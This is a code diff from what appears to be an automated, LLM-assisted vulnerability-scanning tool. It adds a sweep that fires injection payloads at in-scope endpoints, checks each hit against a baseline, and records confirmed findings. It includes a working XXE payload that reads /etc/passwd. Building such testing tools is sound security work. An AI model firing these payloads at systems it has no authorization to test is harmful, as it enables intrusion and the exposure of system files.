@@ -200,16 +200,40 @@ const CAUSE_GUIDANCE: Record<FailureCause, string> = {
  * requests (artifact store), fires each payload class at each input via the Tether-gated
  * http_request path, and returns the strong hits as a hunter directive. Fails soft.
  */
+interface SweepObs {
+  recordFinding: (r: FindingRow) => Promise<void>;
+  mergeFinding: (r: FindingRow) => Promise<void>;
+  mergeEndpoint: (url: string, method: string) => Promise<void>;
+  traceId: () => string | null;
+}
+
+// Non-benchmark sweep classes map onto the nearest scored class for banking (they are
+// XSS-family). ssti/command_injection have no benchmark class, so they are banked under
+// their own label (valid enterprise findings; scored non-canonical for the 28).
+const SWEEP_CLASS_MAP: Record<string, string> = { html_injection: "xss_reflected", dom_xss: "xss_reflected" };
+
+/**
+ * Result of the sweep: the hunter directive (leads) AND the findings it banked DIRECTLY
+ * through the Axiom (so a hit is recorded even if the LLM ignores the directive — the
+ * deterministic discover→verdict path, not a reliance on the model to submit).
+ */
 async function runDeepSweep(opts: {
   runner: ToolRunner; workspace: string; scopeOrigins: string[];
-  canon: (u: string) => string; budget: number;
-}): Promise<string> {
+  canon: (u: string) => string; budget: number; obs: SweepObs; engagementId: string;
+}): Promise<{ leads: string; proved: ProvedEntry[] }> {
+  const empty = { leads: "", proved: [] as ProvedEntry[] };
   try {
     const records = await readArtifactRecords(join(opts.workspace, "artifacts"));
     const inScope = (u: string) => { try { return opts.scopeOrigins.includes(new URL(u).origin); } catch { return false; } };
     const targets = deriveTargets(records, inScope, opts.canon) as SweepTargetWithBody[];
-    if (targets.length === 0) return "";
+    if (targets.length === 0) return empty;
     const sessionLabel = opts.runner.getSessionMeta().find((m) => m.has_auth_material)?.label;
+
+    // Stash the full HttpCapture for every probe so a strong hit can be re-verified by the
+    // Axiom (marker in exploit, absent in baseline) without re-firing.
+    const stash = new Map<string, HttpCapture>();
+    const stashKey = (t: SweepTargetWithBody, param: string, value: string | null) =>
+      `${t.method} ${t.endpoint}\u0000${param}\u0000${value === null ? "__baseline__" : value}`;
 
     const send: SendProbe = async (target, param, value) => {
       const t = target as SweepTargetWithBody;
@@ -217,7 +241,6 @@ async function runDeepSweep(opts: {
       let url = t.endpoint;
       let body: string | null = null;
       const headers: Record<string, string> = { ...(t.headers || {}) };
-      // Drop any stale/redacted auth header; the runner injects real auth via `session`.
       delete headers.Authorization; delete headers.authorization;
       if (t.paramKind[param] === "json" && t.bodyTemplate) {
         try { body = JSON.stringify(setAtPath(JSON.parse(t.bodyTemplate), param, v)); }
@@ -231,41 +254,96 @@ async function runDeepSweep(opts: {
       const r = await opts.runner.execute("http_request", args);
       if (!r.ok) return { status: 0, body: "" };
       const cap = r.result as HttpCapture;
+      stash.set(stashKey(t, param, value), cap);
       return { status: cap.response.status, body: cap.response.body ?? "", ms: cap.ms };
     };
 
     const fieldHits = await runSweep({ targets, payloadsFor: (c) => SWEEP_PAYLOADS[c] ?? [], send, budget: opts.budget });
+    const targetByEndpoint = new Map(targets.map((t) => [t.endpoint, t]));
+    const proved: ProvedEntry[] = [];
+
+    // BANK strong field hits directly through the Axiom (deterministic, not via the LLM).
+    for (const hit of fieldHits) {
+      if (hit.strength !== "strong") continue;
+      const t = targetByEndpoint.get(hit.endpoint);
+      if (!t) continue;
+      const exploit = stash.get(stashKey(t, hit.param, hit.payload));
+      const control = stash.get(stashKey(t, hit.param, null));
+      if (!exploit || !control) continue;
+      const banked = await bankIfConfirmed(opts, hit.vuln_class, hit.endpoint, hit.observed, exploit, control);
+      if (banked) proved.push(banked);
+    }
+
+    // XXE whole-body probe (field-injection can't express an external entity).
     const xxeHits = await sweepXxe(targets, opts.runner, sessionLabel);
-    return renderSweepLeads([...fieldHits, ...xxeHits]);
-  } catch { return ""; }
+    for (const xh of xxeHits) {
+      if (!xh.exploit || !xh.control) continue;
+      const banked = await bankIfConfirmed(opts, "xxe", xh.endpoint, xh.observed, xh.exploit, xh.control);
+      if (banked) proved.push(banked);
+    }
+
+    const leadsHits = [...fieldHits.filter((h) => h.strength === "strong"), ...xxeHits];
+    return { leads: renderSweepLeads(leadsHits), proved };
+  } catch { return empty; }
+}
+
+/** Verify a sweep hit with the SAME Axiom the LLM path uses (marker present in exploit,
+ * absent in control), and on CONFIRMED record the finding to the stores + return a proved
+ * entry. evaluate() rejects any non-literal marker, so this cannot fabricate a finding. */
+async function bankIfConfirmed(
+  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
+  vulnClass: string, endpoint: string, marker: string, exploit: HttpCapture, control: HttpCapture,
+): Promise<ProvedEntry | null> {
+  const inv: Invariant = {
+    statement: `deep-sweep: response contains ${marker} for exploit but not control`,
+    type: "body_contains", expression: marker,
+  };
+  const verdict = evaluate(inv, exploit, control);
+  if (verdict.status !== "CONFIRMED") return null;
+  const cls = SWEEP_CLASS_MAP[vulnClass] ?? vulnClass;
+  const ep = opts.canon(endpoint);
+  const findingId = `SAHW-${randomUUID().slice(0, 8)}`;
+  const row: FindingRow = {
+    engagement_id: opts.engagementId, finding_id: findingId, vuln_class: cls, endpoint: ep,
+    verdict: "CONFIRMED", invariant_type: "body_contains",
+    verdict_reason: boundReason(`deep-sweep: ${verdict.reason}`),
+    langfuse_trace_id: opts.obs.traceId(), utc: new Date().toISOString(),
+  };
+  await opts.obs.mergeEndpoint(ep, exploit.request.method || "GET");
+  await opts.obs.mergeFinding(row);
+  await opts.obs.recordFinding(row);
+  return { vuln_class: cls, endpoint: ep, invariant_type: "body_contains", verdict: "CONFIRMED", finding_id: findingId };
 }
 
 /** Whole-body XXE probe (field-injection cannot express an XML external entity). One
- * bounded payload per body-bearing endpoint; a returned /etc/passwd signature is a hit. */
-async function sweepXxe(targets: SweepTargetWithBody[], runner: ToolRunner, sessionLabel?: string): Promise<SweepHit[]> {
-  const hits: SweepHit[] = [];
+ * bounded payload per body-bearing endpoint; returns the exploit + a benign-XML control
+ * capture so the caller can verify body_contains the /etc/passwd signature. */
+async function sweepXxe(targets: SweepTargetWithBody[], runner: ToolRunner, sessionLabel?: string): Promise<Array<SweepHit & { exploit?: HttpCapture; control?: HttpCapture }>> {
+  const hits: Array<SweepHit & { exploit?: HttpCapture; control?: HttpCapture }> = [];
   const xml = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY sahwx SYSTEM "file:///etc/passwd">]><r><x>&sahwx;</x></r>`;
+  const benign = `<?xml version="1.0"?><r><x>sahwbenignxml</x></r>`;
   let n = 0;
   for (const t of targets) {
     if (n >= 8) break;
     if (t.method !== "POST" && t.method !== "PUT" && t.method !== "PATCH") continue;
     if (!t.bodyTemplate) continue;
     n++;
-    const args: Record<string, unknown> = {
-      method: t.method, url: t.endpoint,
-      headers: { "Content-Type": "application/xml", Accept: "application/xml" }, body: xml,
-    };
-    if (sessionLabel) args.session = sessionLabel;
-    const r = await runner.execute("http_request", args);
-    if (!r.ok) continue;
-    const cap = r.result as HttpCapture;
-    if ((cap.response.body ?? "").includes("root:x:0:0")) {
-      hits.push({
-        vuln_class: "xxe", endpoint: t.endpoint, param: "(xml body)", payload: xml, strength: "strong",
-        observed: "root:x:0:0",
-        note: "external entity read /etc/passwd; send with Content-Type application/xml, body_contains the entity content",
-      });
-    }
+    const hdr = { "Content-Type": "application/xml", Accept: "application/xml" };
+    const mk = (body: string): Record<string, unknown> => sessionLabel
+      ? { method: t.method, url: t.endpoint, headers: hdr, body, session: sessionLabel }
+      : { method: t.method, url: t.endpoint, headers: hdr, body };
+    const er = await runner.execute("http_request", mk(xml));
+    if (!er.ok) continue;
+    const exploit = er.result as HttpCapture;
+    if (!(exploit.response.body ?? "").includes("root:x:0:0")) continue;
+    const cr = await runner.execute("http_request", mk(benign));
+    const control = cr.ok ? (cr.result as HttpCapture) : undefined;
+    hits.push({
+      vuln_class: "xxe", endpoint: t.endpoint, param: "(xml body)", payload: xml, strength: "strong",
+      observed: "root:x:0:0",
+      note: "external entity read /etc/passwd; Content-Type application/xml, body_contains the entity content",
+      exploit, control,
+    });
   }
   return hits;
 }
@@ -930,12 +1008,15 @@ export async function runBeat(opts: {
   // starve the LLM loop (observed: beats stalling at 0 findings). beatNo<=1 (or unknown)
   // = first beat. Later beats inherit the banked findings via the spine.
   let sweepLeads = "";
+  let sweepProved: ProvedEntry[] = [];
   const sweepBeatNo = Math.max(0, Math.trunc(numEnv(opts.env, "SAHW_BEAT_NO", 1)));
   if (engagement.deep.enabled && sweepBeatNo <= 1) {
-    sweepLeads = await runDeepSweep({
+    const sw = await runDeepSweep({
       runner, workspace, scopeOrigins, canon: canonicalizeEndpoint,
-      budget: engagement.deep.maxSweepRequests,
+      budget: engagement.deep.maxSweepRequests, obs, engagementId: engagement.authRef,
     });
+    sweepLeads = sw.leads;
+    sweepProved = sw.proved;
   }
 
   try {
@@ -1072,7 +1153,7 @@ export async function runBeat(opts: {
             beat: beatRecord,
             discoveredEndpoints,
             recoveredIntel: { ...inferred, ...recoveredIntelFromClaims, ...registrationRecipe },
-            proved: provedEntries,
+            proved: [...provedEntries, ...sweepProved],
             attempted: attemptedEntries,
             // Persist account LABELS + non-secret metadata (no token, no password —
             // getSessionMeta/SessionMeta carry neither) so a later beat's hunter knows
